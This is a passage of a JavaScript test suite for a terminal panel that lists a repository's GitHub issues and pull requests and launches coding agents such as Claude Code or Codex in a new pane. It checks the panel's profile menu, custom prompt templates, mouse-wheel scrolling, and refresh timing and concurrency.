    assert.ok(why[0]?.startsWith("    Resolve prompt:"), shown);
    assert.ok(shows(why, reason) || why.at(-1).trimEnd().endsWith("…"), shown);
    // At 12 rows and more, the first reason is whole.
    if (rows >= 12) assert.ok(shows(why, "Resolve prompt: must contain {number}, where the number goes"), shown);
    // What you type next shows too.
    lines = at(" MORE");
    assert.ok(lines.some((l) => /^▌ .*MORE $/.test(l)), `${cols}x${rows}:\n${lines.join("\n")}`);
    at("\x1b\x1b");
  }
});

test("the wheel reaches the prompt rows and the prompt's buttons in a short pane", (t) => {
  const dir = home(t);
  const wheel = (down) => `\x1b[<${down ? 65 : 64};2;5M`;
  for (const cols of [28, 30, 40]) for (const rows of [8, 10, 12, 16]) for (const n of [0, 2]) {
    const profiles = Array.from({ length: n }, (_, i) => ({ id: `p${i}`, name: `Profile ${i}`, harness: "claude" }));
    const file = usePrompts(dir, { resolve: "Go {number}" }, profiles);
    setupGitHub("issues");
    const at = (keys) => screenAt(cols, rows, () => onInput(Buffer.from(keys)));
    const where = (lines) => `${cols}x${rows} n=${n}:\n${lines.join("\n")}`;
    at("s");
    // Down through the profiles to the prompt rows, the selected one on screen with its Edit.
    let lines;
    for (let i = 0; i <= n; i++) lines = at(wheel(true));
    assert.equal(ui.settings.promptSel, "resolve", where(lines));
    lines = at(wheel(true) + wheel(true));
    assert.equal(ui.settings.promptSel, "review", where(lines));
    assert.ok(lines.some((l) => /^▌ Review prompt +Edit $/.test(l ?? "")), where(lines));
    fitsWithHints(lines, cols, rows, "↑↓ select", "esc back");
    // And back up to the profiles.
    for (let i = 0; i < 2; i++) lines = at(wheel(false));
    assert.equal(ui.settings.promptSel, null, where(lines));
    assert.equal(ui.settings.sel, n, where(lines));
    lines = at(wheel(true));
    assert.equal(ui.settings.promptSel, "resolve", where(lines));
    // The Resolve prompt's editor: the wheel scrolls it down to its buttons, which work.
    lines = at("\r");
    assert.equal(ui.settings.mode, "prompt", where(lines));
    for (let i = 0; i < 10 && find(lines, " Cancel ")[1] < 0; i++) lines = at(wheel(true));
    fitsWithHints(lines, cols, rows, "type to edit", "esc back");
    for (const label of [" Use default ", " Cancel "]) assert.ok(find(lines, label)[1] >= 0, `${label}\n${where(lines)}`);
    // A key brings back the line you type on.
    lines = at("Q");
    assert.ok(lines.some((l) => /^▌ Go \{number\}Q $/.test(l ?? "")), where(lines));
    for (let i = 0; i < 10 && find(lines, " Cancel ")[1] < 0; i++) lines = at(wheel(true));
    const [x, y] = find(lines, " Use default ");
    lines = at(`\x1b[<0;${x + 2};${y + 1}M`);
    assert.equal(ui.settings.mode, "list", where(lines));
    assert.equal(JSON.parse(fs.readFileSync(file, "utf8")).prompts, undefined, where(lines));
    // A delete question waits for its key: the wheel neither answers nor moves it.
    if (n) {
      at("\x1b[Ad");
      assert.equal(ui.settings.mode, "confirm");
      at(wheel(true) + wheel(false));
      assert.equal(ui.settings.mode, "confirm");
      assert.equal(ui.settings.sel, n);
      at("n");
    }
    at("\x1b");
  }
});

test("a prompt saved with a click after the wheel shows its reason and the line you type on", (t) => {
  const dir = home(t);
  const wheel = `\x1b[<65;2;5M`;
  for (const cols of [28, 30, 40]) for (const rows of [8, 10, 12]) {
    useProfiles(dir, []);
    setupGitHub("issues");
    const at = (keys) => screenAt(cols, rows, () => onInput(Buffer.from(keys)));
    let lines = at("sj\rNo number here ZZEND");
    for (let i = 0; i < 10 && find(lines, " Cancel ")[1] < 0; i++) lines = at(wheel);
    const [x, y] = find(lines, " Save ");
    assert.ok(y >= 0, `${cols}x${rows}:\n${lines.join("\n")}`);
    lines = at(`\x1b[<0;${x + 2};${y + 1}M`);
    const shown = `${cols}x${rows}:\n${lines.join("\n")}`;
    assert.equal(ui.settings.mode, "prompt", shown);
    fitsWithHints(lines, cols, rows, "type to edit", "esc back");
    assert.ok(lines.some((l) => /^▌ .*ZZEND $/.test(l ?? "")), shown);
    const why = lines.filter((l) => /^ {4}\S/.test(l ?? ""));
    assert.ok(why[0]?.startsWith("    Resolve prompt:"), shown);
    assert.ok(shows(why, "Resolve prompt: must contain {number}, where the number goes") || why.at(-1).trimEnd().endsWith("…"), shown);
    at("\x1b\x1b");
  }
});

test("with the last profile selected, the prompt rows under it show where there is room", (t) => {
  const dir = home(t);
  useProfiles(dir, [{ id: "p0", name: "Profile 0", harness: "claude" }]);
  for (const [cols, rows] of [[28, 16], [30, 16], [40, 14]]) {
    setupGitHub("issues");
    const lines = screenAt(cols, rows, () => onInput(Buffer.from("sj")));
    const where = `${cols}x${rows}:\n${lines.join("\n")}`;
    assert.equal(ui.settings.sel, 1, where);
    assert.ok(lines.some((l) => /^▌ Profile 0/.test(l ?? "")), where);
    const review = lines.findIndex((l) => /^ {2}Review prompt$/.test(l?.trimEnd() ?? ""));
    assert.ok(review > 0 && /^ {4}default: \/issue-pr-/.test(lines[review + 1]), where);
    screenAt(cols, rows, () => onInput(Buffer.from("\x1b")));
  }
});

test("a custom prompt from the profiles view is what Resolve then sends", async (t) => {
  claudeHome(t);
  setupGitHub("issues");
  screen(() => onInput(Buffer.from("sjj\rResolve issue {number} with tests first\r\x1b")));
  assert.equal(ui.settings, null);
  fakeHerdr(claudeHere);
  const after = await screenAsync(() => startWithMenu());
  assert.equal(herdrCalls()[3], "agent prompt w1:p7 Resolve issue 12 with tests first --wait --until working --until blocked --until done --timeout 15000");
  assert.ok(text(after).includes("Started Claude Code in a new pane: Resolve issue 12 with tests first"), after.join("\n"));
});

// ── The profile menu ────────────────────────────────────────────────────────

const CC = { id: "cc", name: "Claude Code", harness: "claude" }, CX = { id: "cx", name: "Codex quick", harness: "codex" };
// The box's line for a profile, as drawn: its marker, name and hint, then the border.
const entryLine = (lines, label) => lines.findIndex((l) => l?.includes(`│ ▸ ${label}`) || l?.includes(`│   ${label}`));
const resolveButton = (lines, n) => {
  const y = lines.findIndex((l) => l?.trim() === `Resolve #${n}`);
  return [lines[y]?.indexOf("Resolve"), y];
};

test("with only the default profile, a and a row's button start at once, with no menu", async (t) => {
  const dir = home(t, { ".mcc/profiles/work/skills/issue-resolver/SKILL.md": "x" });
  const bin = mccOnPath(t);
  mccEnv(path.join(dir, ".mcc/profiles/work"));
  let lines = setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent list": appears("working", 2) });
  let menu = "unset";
  await screenAsync(() => { onInput(Buffer.from("a")); menu = ui.menu; });
  assert.equal(menu, null, "a opened a menu with nothing to choose");
  assert.ok(herdrCalls().includes(`pane run w1:p7 '${bin}' 'run' '--' '/issue-resolver 12'`), herdrCalls().join("\n"));
  lines = setupGitHub("issues");
  fakeHerdr(claudeHere, { "agent list": appears("working", 2) });
  const [x, y] = resolveButton(lines, 11);
  menu = "unset";
  await screenAsync(() => { click(x, y); menu = ui.menu; });
  assert.equal(menu, null, "the row's button opened a menu with nothing to choose");
  assert.ok(herdrCalls().includes(`pane run w1:p7 '${bin}' 'run' '--' '/issue-resolver 11'`), herdrCalls().join("\n"));
  assert.deepEqual(opened, []);
});

test("with more profiles, a opens a menu of every one, the default first and the action's own highlighted", (t) => {
  const dir = claudeHome(t);
  useProfiles(dir, [CC, CX], { resolve: "cx", review: "cc" });
  setupGitHub("issues");
  const lines = screen(() => onInput(Buffer.from("a")));
  assert.deepEqual(ui.menu?.entries.map((p) => p.id), ["default", "cc", "cx"]);
  assert.equal(ui.menu.sel, 2);
  assert.ok(lines.some((l) => /│ {3}Claude Code via mcc run · default +│$/.test(l ?? "")), lines.join("\n"));
  assert.ok(lines.some((l) => /│ {3}Claude Code +│$/.test(l ?? "")), lines.join("\n"));
  assert.ok(lines.some((l) => /│ ▸ Codex quick · Codex +│$/.test(l ?? "")), lines.join("\n"));
  assert.ok(lines.some((l) => l?.includes("┌ Resolve #12 with")), lines.join("\n"));
  assert.match(lines[FOOTER], /^ ↑↓ choose · ⏎ start · esc cancel/);
  // ↑ and ↓ (and k and j) move, and stop at either end; a does nothing while it's open.
  screen(() => onInput(Buffer.from("kkkkk")));
  assert.equal(ui.menu.sel, 0);
  screen(() => onInput(Buffer.from("\x1b[B\x1b[Bjj")));
  assert.equal(ui.menu.sel, 2);
  screen(() => onInput(Buffer.from("\x1b[Aa")));
  assert.equal(ui.menu?.sel, 1);
  assert.deepEqual(calls, []);
  // A review gets its own profile highlighted.
  setupGitHub("prs");
  screen(() => onInput(Buffer.from("a")));
  assert.equal(ui.menu?.key, "review");
  assert.equal(ui.menu.sel, 1);
});

test("the profile chosen in the menu starts, with the action's custom prompt, by key or click", async (t) => {
  const dir = home(t);
  usePrompts(dir, { resolve: "Fix #{number} carefully" }, [CC, CX], { resolve: "cc" });
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  // j to Codex, which isn't Resolve's own, then enter.
  await screenAsync(() => { onInput(Buffer.from("a")); assert.equal(ui.menu.sel, 1); onInput(Buffer.from("j\r")); });
  assert.equal(ui.menu, null);
  assert.deepEqual(herdrCalls(), [
    "agent list",
    "pane split w1:p1 --direction down --cwd /repo --no-focus",
    "agent start resolve-12 --kind codex --pane w1:p7 --timeout 55000",
    "agent prompt w1:p7 Fix #12 carefully --wait --until working --until blocked --until done --timeout 15000",
  ]);
  // A click on a profile starts that one, whichever is highlighted.
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  const lines = screen(() => onInput(Buffer.from("a")));
  const y = entryLine(lines, "Codex quick");
  assert.ok(y > 0 && ui.menu.sel !== 2, lines.join("\n"));
  await screenAsync(() => click(lines[y].indexOf("│") + 3, y));
  assert.equal(herdrCalls()[2], "agent start resolve-12 --kind codex --pane w1:p7 --timeout 55000");
  assert.equal(herdrCalls()[3], "agent prompt w1:p7 Fix #12 carefully --wait --until working --until blocked --until done --timeout 15000");
  assert.deepEqual(opened, []);
});

test("esc, q, the wheel and a click elsewhere close the menu and start nothing, and the panel stays", (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  const closers = {
    esc: () => onInput(Buffer.from("\x1b")),
    q: () => onInput(Buffer.from("q")),
    wheel: () => onInput(Buffer.from(wheelDown)),
    "a row": (lines) => onInput(Buffer.from(press(lines.findIndex((l) => l?.includes("Title 0"))))),
    // Its other half: a click that went on to the switch would change the list.
    "the switch": () => onInput(Buffer.from(press(2))),
    "the header's ⚙": (lines) => click(lines[0].indexOf("⚙"), 0),
  };
  for (const [what, close] of Object.entries(closers)) {
    const lines = setupGitHub("issues");
    fakeHerdr(claudeHere);
    // From a row's button, so the box is under that row, clear of the switch.
    const [x, y] = resolveButton(lines, 11);
    const open = screen(() => click(x, y));
    assert.ok(ui.menu, what);
    assert.ok(open[y + 1].includes("┌ Resolve #11 with"), `${what}\n${open.join("\n")}`);
    const exit = noExit(() => screen(() => close(open)));
    assert.equal(exit, null, `${what} closed the panel`);
    assert.equal(ui.menu, null, `${what} left the menu open`);
    assert.deepEqual(herdrCalls(), [], what);
    assert.deepEqual(opened, [], `${what} opened a URL`);
    assert.equal(ui.view, "issues", what);
    assert.equal(ui.settings, null, `${what} opened the profiles`);
  }
});

test("the header's button opens the menu under the header, a row's under that row's button", (t) => {
  claudeHome(t);
  let lines = setupGitHub("issues");
  const bx = buttonAt(lines, "Resolve");
  lines = screen(() => click(bx + 1, 0));
  assert.equal(ui.menu?.anchor, "header");
  assert.match(lines[0], /Resolve #12/);
  assert.match(lines[1], /^ *┌ Resolve #12 with ─*┐$/);
  // At the right edge, as near the button as it fits.
  assert.equal(lines[1].length, 60, lines.join("\n"));
  assert.ok(lines[1].indexOf("┌") <= bx, lines.join("\n"));
  // A row's: right under its button, from the button's column.
  lines = setupGitHub("issues");
  const [x, y] = resolveButton(lines, 11);
  lines = screen(() => click(x, y));
  assert.equal(ui.menu?.anchor, "row");
  assert.equal(ui.menu.number, 11);
  assert.match(lines[y], /^▌ +Resolve #11 $/);
  assert.equal(lines[y + 1].indexOf("┌ Resolve #11 with"), x - 1, lines.join("\n"));
  // The last row's button sits low: the menu goes above it.
  setupGitHub("issues");
  ui.sel.issues = 9;
  lines = screen(() => onInput(Buffer.from("a")));
  const at = lines.findIndex((l) => /Resolve #19 $/.test(l ?? ""));
  assert.ok(at > LIST.from && lines[at - 1].trimStart().startsWith("└"), lines.join("\n"));
  assert.ok(lines.slice(LIST.from, at).some((l) => l?.includes("┌ Resolve #19 with")), lines.join("\n"));
});

test("a profile deleted while the menu is open starts nothing and says so", (t) => {
  const dir = claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  screen(() => onInput(Buffer.from("a")));
  assert.equal(ui.menu.entries[ui.menu.sel].id, "cc");
  useProfiles(dir, [], {});
  const lines = screen(() => onInput(Buffer.from("\r")));
  assert.equal(ui.menu, null);
  assert.equal(ui.acting, null);
  assert.deepEqual(herdrCalls(), []);
  assert.equal(ui.notice?.tone, "error");
  assert.ok(text(lines).includes("The profile Claude Code isn't there any more, so nothing started"), lines.join("\n"));
});

test("a row gone in a refresh while its menu is open starts nothing and says so", (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  // The refresh draws: the menu closes, with why.
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  screen(() => onInput(Buffer.from("a")));
  assert.ok(ui.menu);
  ui.issues = ui.issues.filter((x) => x.number !== 12);
  let lines = screen(draw);
  assert.equal(ui.menu, null);
  assert.ok(text(lines).includes("The issue #12 isn't in the list any more, so nothing started."), lines.join("\n"));
  // Enter then is the rows' again: it opens the selected row, and starts nothing.
  screen(() => onInput(Buffer.from("\r")));
  assert.deepEqual(herdrCalls(), []);
  // Gone with no draw between: enter starts nothing.
  setupGitHub("issues");
  screen(() => onInput(Buffer.from("a")));
  ui.issues = ui.issues.filter((x) => x.number !== 12);
  lines = screen(() => onInput(Buffer.from("\r")));
  assert.equal(ui.menu, null);
  assert.deepEqual(herdrCalls(), []);
  assert.ok(text(lines).includes("The issue #12 isn't in the list any more"), lines.join("\n"));
});

test("while a launch is under way, a and the buttons open no menu", (t) => {
  claudeHome(t);
  const lines = setupGitHub("issues");
  ui.acting = new Promise(() => {});
  try {
    const [x, y] = resolveButton(lines, 11);
    for (const press of [() => onInput(Buffer.from("a")), () => click(buttonAt(lines, "Resolve") + 1, 0), () => click(x, y)]) {
      screen(press);
      assert.equal(ui.menu, null);
    }
    assert.deepEqual(calls, []);
  } finally { ui.acting = null; }
});

test("at 28, 30, 40 and 60 cells the menu fits, with a 40-character name, and its profiles take a click", async (t) => {
  const dir = home(t, { ".agents/skills/issue-resolver/SKILL.md": "x" });
  useProfiles(dir, [{ id: "long", name: LONG_NAME, harness: "pi" }], {});
  for (const cols of [28, 30, 40, 60]) for (const anchor of ["row", "header"]) {
    let lines = setupGitHub("issues");
    fakeHerdr(claudeHere);
    lines = screenAt(cols, 24, draw);
    lines = screenAt(cols, 24, () => (anchor === "row" ? onInput(Buffer.from("a")) : click(lines[0].indexOf("Resolve") + 1, 0)));
    const where = `${cols} ${anchor}:\n${lines.join("\n")}`;
    assert.equal(ui.menu?.anchor, anchor, where);
    for (const l of lines) assert.ok(width(l ?? "") <= cols, `${where}\n${l}`);
    // The full key hints when they fit, else the short ones: esc cancel stays in view.
    assert.match(lines[FOOTER], cols >= 33 ? /^ ↑↓ choose · ⏎ start · esc cancel/ : /^ ↑↓ · ⏎ start · esc cancel *$/, where);
    // The name, cut to the box when it must, ending in "…".
    const y = lines.findIndex((l) => l?.includes("│   Abcdefghij"));
    assert.ok(y > 0, where);
    assert.ok(lines[y].includes(LONG_NAME) || lines[y].includes("…"), where);
    const after = await screenAsync(() => click(lines[y].indexOf("│") + 2, y), cols);
    assert.equal(herdrCalls()[2], "agent start resolve-12 --kind pi --pane w1:p7 --timeout 55000", where);
    for (const l of after) assert.ok(width(l ?? "") <= cols, `${cols}: ${l}`);
  }
});

test("a menu longer than the room shows a window of it that follows the highlight, arrows on its borders", async (t) => {
  const dir = home(t, { ".agents/skills/issue-resolver/SKILL.md": "x" });
  const profiles = Array.from({ length: 10 }, (_, i) => ({ id: `p${i}`, name: `Profile ${i}`, harness: "pi", model: `m${i}` }));
  useProfiles(dir, profiles, { resolve: "p0" });
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  const rows = 14, lastList = rows - 2;
  const at = (fn) => screenAt(60, rows, fn);
  const inBox = (lines) => lines.map((l, y) => [l, y]).filter(([l]) => /│ [▸ ] /.test(l ?? ""));
  let lines = at(() => onInput(Buffer.from("a")));
  assert.equal(ui.menu.entries.length, 11);
  let shown = inBox(lines);
  assert.ok(shown.length < 11, lines.join("\n"));
  // Inside the list, the key hints last, the highlighted profile in view.
  for (const [, y] of shown) assert.ok(y >= 1 && y <= lastList, lines.join("\n"));
  assert.match(lines[rows - 1], /^ ↑↓ choose/);
  assert.ok(shown.some(([l]) => l.includes("▸ Profile 0")), lines.join("\n"));
  assert.ok(lines.some((l) => /^ *└─*↓┘$/.test(l ?? "")), lines.join("\n"));
  // Down past the window: it scrolls, keeping the highlight in view.
  lines = at(() => onInput(Buffer.from("j".repeat(10))));
  shown = inBox(lines);
  assert.ok(shown.some(([l]) => l.includes("▸ Profile 9")), lines.join("\n"));
  assert.ok(!shown.some(([l]) => l.includes("Claude Code via mcc run")), lines.join("\n"));
  assert.ok(lines.some((l) => /┌ Resolve #12 with ─*↑┐$/.test(l ?? "")), lines.join("\n"));
  // A click on a profile in view starts that one.
  const [l, y] = shown.find(([x]) => x.includes("│   Profile 8"));
  await screenAsync(() => click(l.indexOf("│") + 3, y));
  assert.equal(herdrCalls()[2], "agent start resolve-12 --kind pi --pane w1:p7 --timeout 55000 -- --model m8");
});

// ── Refresh (#42) ───────────────────────────────────────────────────────────

// Run fn with the panel's frames kept off node --test's stdout. Only the frames: the
// test runner reports through stdout too, while fn awaits.
async function quietly(fn) {
  const { write } = process.stdout;
  process.stdout.write = (s, ...rest) => typeof s === "string" && s.startsWith("\x1b[?2026h") ? true : write.call(process.stdout, s, ...rest);
  try { return await fn(); } finally { process.stdout.write = write; }
}
const gitCalls = () => calls.filter((c) => c[0] === "git").length;
const settle = async () => { for (let i = 0; i < 5; i++) await new Promise((r) => setImmediate(r)); };
const holdGit = (name) => name === "git";

test("a refresh that never ends holds back the timer's only until it has hung; the next one then shows its answer (#42)", { timeout: 5000 }, async (t) => {
  const limit = REFRESH.hungMs;
  t.after(() => { REFRESH.hungMs = limit; hold = () => false; held.length = 0; });
  setup("issues");
  await quietly(async () => {
    REFRESH.hungMs = 60 * 60000;
    hold = holdGit;
    refresh(true);
    const before = gitCalls();
    assert.equal(ui.loading, true);
    // Still running and not hung: the timer's refresh starts nothing.
    await refresh();
    assert.equal(gitCalls(), before);
    assert.equal(ui.loading, true);
    // Hung: the timer's refresh starts one, whose answer shows and stops the spinner.
    hold = () => false;
    REFRESH.hungMs = 0;
    await refresh();
    assert.equal(gitCalls(), before + 1);
    assert.equal(ui.loading, false);
    assert.equal(ui.error, "Not a git repository");
  });
});

test("while a refresh never ends, the refresh button, r and a new folder each start one once its grace is over (#42)", { timeout: 5000 }, async (t) => {
  const grace = REFRESH.graceMs;
  t.after(() => { REFRESH.graceMs = grace; hold = () => false; held.length = 0; });
  // The grace (#45) over at once: here a press always finds the hung refresh past it.
  REFRESH.graceMs = 0;
  setup("issues");
  const starts = {
    "refresh(true)": () => refresh(true),
    r: () => onInput(Buffer.from("r")),
    "a new folder": () => { ui.context = "/somewhere/else"; return refresh(); },
  };
  await quietly(async () => {
    for (const [how, start] of Object.entries(starts)) {
      hold = holdGit;
      refresh(true);
      assert.equal(ui.loading, true, how);
      hold = () => false;
      const before = gitCalls();
      await start();
      await settle();
      assert.equal(gitCalls(), before + 1, how);
      assert.equal(ui.loading, false, how);
      assert.equal(ui.error, "Not a git repository", how);
    }
  });
  // The header's refresh button forces one too.
  const src = fs.readFileSync(path.join(__dirname, "..", "panel.js"), "utf8");
  assert.match(src, /from: at \+ 3, to: at \+ 6, action: \(\) => refresh\(true\) \}/);
  // The timer's refresh, every POLL, through poll() (#44), which doesn't press.
  assert.match(src, /setInterval\(poll, POLL\);/);
  assert.match(src, /P\.refreshDue\(ui\.every, ui\.fetchedAt, Date\.now\(\)\)\)\) return refresh\(\);/);
});

test("a refresh that answers after another replaced it changes nothing and leaves the newer one's spinner on (#42)", { timeout: 5000 }, async (t) => {
  const grace = REFRESH.graceMs;
  t.after(() => { REFRESH.graceMs = grace; hold = () => false; held.length = 0; });
  REFRESH.graceMs = 0;
  setup("issues");
  await quietly(async () => {
    for (const late of [{ stdout: "/old\n" }, { error: new Error("spawn git ENOENT") }]) {
      hold = holdGit;
      refresh(true);
      const old = held.at(-1);
      const second = refresh(true), now = held.at(-1);
      assert.notEqual(old, now);
      const waiting = held.length;
      ui.error = null;
      ui.root = null;
      // Not awaited: a replaced refresh that went on would wait on a held git remote.
      old.answer(late);
      await settle();
      // The old one stopped there: no git remote, no root, no error, spinner still on.
      assert.equal(held.length, waiting);
      assert.equal(ui.root, null);
      assert.equal(ui.error, null);
      assert.equal(ui.loading, true);
      hold = () => false;
      now.answer({ code: 1, stderr: "not a git repository" });
      await second;
      assert.equal(ui.loading, false);
      assert.equal(ui.error, "Not a git repository");
    }
  });
});

// ── Repeated presses (#45) ──────────────────────────────────────────────────

// Lets the refresh still running end, so the next test finds none: a press past
// the grace replaces it with one that answers.
async function finishRefresh() {
  hold = () => false;
  REFRESH.graceMs = 0;
  await refresh(true);
  await settle();
}

test("pressing r again and again, or the refresh button, while a refresh runs starts one refresh, not one per press (#45)", { timeout: 5000 }, async (t) => {
  const grace = REFRESH.graceMs;
  t.after(() => { REFRESH.graceMs = grace; hold = () => false; held.length = 0; });
  const lines = setup("issues");
  await quietly(async () => {
    hold = holdGit;
    // None running: one press starts one at once.
    const before = gitCalls();
    onInput(Buffer.from("r"));
    assert.equal(gitCalls(), before + 1);
    assert.equal(ui.loading, true);
    // Held r, the header's ↻ and the refresh function, all within the grace: nothing more.
    onInput(Buffer.from("r".repeat(30)));
    click(lines[0].indexOf("↻"), 0);
    for (let i = 0; i < 5; i++) refresh(true);
    await settle();
    assert.equal(gitCalls(), before + 1);
    assert.equal(held.length, 1);
    assert.equal(ui.loading, true);
    await finishRefresh();
    assert.equal(ui.loading, false);
    assert.equal(ui.error, "Not a git repository");
  });
});

test("once its grace is over, the next r replaces a refresh that never ends, and its answer shows (#45, #42)", { timeout: 5000 }, async (t) => {
  const grace = REFRESH.graceMs;
  t.after(() => { REFRESH.graceMs = grace; hold = () => false; held.length = 0; });
  setup("issues");
  await quietly(async () => {
    REFRESH.graceMs = 30;
    hold = holdGit;
    refresh(true);
    const before = gitCalls();
    onInput(Buffer.from("r"));
    assert.equal(gitCalls(), before);
    await new Promise((r) => setTimeout(r, 40));
    hold = () => false;
    onInput(Buffer.from("r"));
    await settle();
    assert.equal(gitCalls(), before + 1);
    assert.equal(ui.loading, false);
    assert.equal(ui.error, "Not a git repository");
  });
});

test("a new folder replaces a running refresh at once, grace or not (#45)", { timeout: 5000 }, async (t) => {
  const grace = REFRESH.graceMs;
  t.after(() => { REFRESH.graceMs = grace; hold = () => false; held.length = 0; });
  setup("issues");
  await quietly(async () => {
    REFRESH.graceMs = 60 * 60000;
    hold = holdGit;
    refresh(true);
    hold = () => false;
    const before = gitCalls();
    ui.context = "/somewhere/else";
    await refresh();
    assert.equal(gitCalls(), before + 1);
    assert.equal(ui.loading, false);
  });
});

// ── Refresh interval (#44) ──────────────────────────────────────────────────

test("the panel's state folder is the test's, not the real one", () => {
  assert.equal(STATE, stateDir);
});

test("t steps the refresh interval through 30s, 1m, 5m, 15m and manual, says so and shows it in the key hints (#44)", (t) => {
  t.after(() => { ui.every = P.DEFAULT_REFRESH; fs.rmSync(path.join(stateDir, "refresh"), { force: true }); });
  setup("issues");
  assert.equal(ui.every, "1m");
  // The key hints in a pane wide enough for all of them.
  const hints = () => screenAt(120, 24, draw)[FOOTER];
  assert.match(hints(), /r refresh · t interval: 1m · o repo/);
  const seen = [];
  for (let i = 0; i < 5; i++) {
    const lines = screen(() => onInput(Buffer.from("t")));
    seen.push(ui.every);
    // Kept for the next run.
    assert.equal(fs.readFileSync(path.join(stateDir, "refresh"), "utf8"), ui.every);
    assert.equal(ui.notice.tone, "ok");
    assert.equal(ui.notice.text, P.refreshNotice(ui.every));
    assert.ok(lines.some((l) => l?.includes(P.refreshNotice(ui.every).slice(0, 30))), lines.join("\n"));
  }
  assert.deepEqual(seen, ["5m", "15m", "manual", "30s", "1m"]);
  screen(() => onInput(Buffer.from("tt")));
  assert.equal(ui.every, "15m");
  assert.match(hints(), /t interval: 15m/);
  screen(() => onInput(Buffer.from("t")));
  assert.match(hints(), /r refresh · t interval: manual · o repo/);
});

test("the refresh interval chosen is read back when the panel starts again; an unknown one is the default (#44)", (t) => {
  const file = path.join(stateDir, "refresh");
  t.after(() => { ui.every = P.DEFAULT_REFRESH; fs.rmSync(file, { force: true }); });
  for (const [kept, read] of [["manual", "manual"], ["15m\n", "15m"], ["30s", "30s"], ["2m", "1m"], ["", "1m"]]) {
    ui.every = "5m";
    fs.writeFileSync(file, kept);
    restore();
    assert.equal(ui.every, read, JSON.stringify(kept));
  }
  // None kept yet: what the panel had, the default.
  fs.rmSync(file, { force: true });
  ui.every = P.DEFAULT_REFRESH;
  restore();
  assert.equal(ui.every, "1m");
});

test("in a narrow pane the key hints still show t and the interval whole, after ⏎ open or first (#47)", (t) => {
  t.after(() => { ui.every = P.DEFAULT_REFRESH; });
  const footer = (cols) => {
    const lines = screenAt(cols, 24, draw);
    for (const l of lines) assert.ok(width(l ?? "") <= cols, `${cols}: ${l}`);
    return lines[FOOTER];
  };
  setup("issues");
  // As wide as all of them take: as they were, t and the interval after r refresh.
  assert.equal(footer(73), " ↑↓ select · ⏎ open · ⇥ switch · s profiles · r refresh · t interval: 1m…");
  // A cell less, and at 55: t and the bare interval after ⏎ open.
  assert.equal(footer(72), " ↑↓ select · ⏎ open · t 1m · ⇥ switch · s profiles · r refresh · o repo…");
  assert.equal(footer(55), " ↑↓ select · ⏎ open · t 1m · ⇥ switch · s profiles · r…");
  assert.doesNotMatch(footer(55), /interval/);
  ui.every = "manual";
  assert.match(footer(55), /⏎ open · t manual · ⇥ switch/);
  ui.every = "1m";
  // With the a key at 55, and first when even that doesn't fit.
  setupGitHub("issues");
  assert.match(footer(55), /^ ↑↓ select · ⏎ open · a resolve · t 1m · ⇥ switch/);
  assert.equal(footer(38), " t 1m · ↑↓ select · ⏎ open · a resolv…");
  assert.match(footer(120), /a resolve · ⇥ switch · s profiles · r refresh · t interval: 1m · o repo · q close/);
});

test("the panel refreshes on its own at the chosen interval, and in manual never, only on r or a new folder (#44)", { timeout: 5000 }, async (t) => {
  t.after(() => { ui.every = P.DEFAULT_REFRESH; ui.visible = true; });
  setup("issues");
  await quietly(async () => {
    // The folder the panel follows, read once: only the interval decides now.
    await refresh(true);
    const due = async (every, ago) => {
      ui.every = every;
      ui.fetchedAt = Date.now() - ago;
      const before = gitCalls();
      await poll();
      await settle();
      return gitCalls() > before;
    };
    assert.equal(await due("30s", 31000), true);
    assert.equal(await due("30s", 10000), false);
    assert.equal(await due("1m", 61000), true);
    assert.equal(await due("1m", 50000), false);
    assert.equal(await due("5m", 4 * 60000), false);
    assert.equal(await due("5m", 5 * 60000 + 1000), true);
    assert.equal(await due("15m", 10 * 60000), false);
    assert.equal(await due("15m", 15 * 60000 + 1000), true);
    // Manual: never on its own, however long ago the lists were read.
    assert.equal(await due("manual", 24 * 3600000), false);
    assert.equal(await due("manual", Date.now()), false);
    // A hidden panel never fetches on its own either.
    ui.visible = false;
    assert.equal(await due("30s", 60000), false);
    ui.visible = true;
    // In manual, r refreshes at once.
    let before = gitCalls();
    onInput(Buffer.from("r"));
    await settle();
    assert.equal(gitCalls(), before + 1);
    assert.equal(ui.loading, false);
    // And a new folder is still read, so the lists are never another repo's.
    ui.context = "/somewhere/else";
    before = gitCalls();
    await poll();
    await settle();
    assert.equal(gitCalls(), before + 1);
    assert.notEqual(ui.context, "/somewhere/else");
  });
});
